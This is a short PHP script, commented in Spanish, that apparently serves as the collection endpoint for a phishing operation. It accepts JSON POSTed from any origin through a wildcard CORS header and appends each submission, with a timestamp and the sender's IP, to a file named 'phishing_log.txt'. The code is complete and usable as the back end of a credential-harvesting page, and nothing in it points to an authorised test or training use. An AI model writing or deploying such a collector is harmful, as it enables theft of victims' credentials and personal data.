<?php
// Configura la zona horaria a Guatemala para que el registro de tiempo sea exacto
date_default_timezone_set('America/Guatemala');

// Encabezados para permitir CORS y responder como JSON
header("Content-Type: application/json");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

// Verifica si la solicitud es de tipo POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405); // Método no permitido
    echo json_encode(["status" => "error", "message" => "Método no permitido"]);
    exit;
}

// Obtiene los datos enviados en el cuerpo de la solicitud (formato JSON)
$json_data = file_get_contents("php://input");
$data = json_decode($json_data, true);

// Verifica si los datos son válidos
if ($data === null) {
    http_response_code(400); // Solicitud incorrecta
    echo json_encode(["status" => "error", "message" => "Datos JSON inválidos"]);
    exit;
}

// Genera un registro con la información y la fecha
$log_entry = json_encode([
    'timestamp' => date('Y-m-d H:i:s'),
    'remote_ip' => $_SERVER['REMOTE_ADDR'],
    'payload' => $data
]);

// Nombre del archivo de log
$log_file = 'phishing_log.txt';

// Almacena el registro en el archivo de texto
// Se usa FILE_APPEND para añadir al final y LOCK_EX para evitar errores de concurrencia
if (file_put_contents($log_file, $log_entry . PHP_EOL, FILE_APPEND | LOCK_EX) === false) {
    // Si no se puede escribir, responde con un error interno
    http_response_code(500);
    echo json_encode(["status" => "error", "message" => "No se pudo escribir en el archivo de log"]);
    exit;
}

// Responde al cliente con un mensaje de éxito
echo json_encode(["status" => "success", "message" => "Datos recibidos correctamente"]);
?>
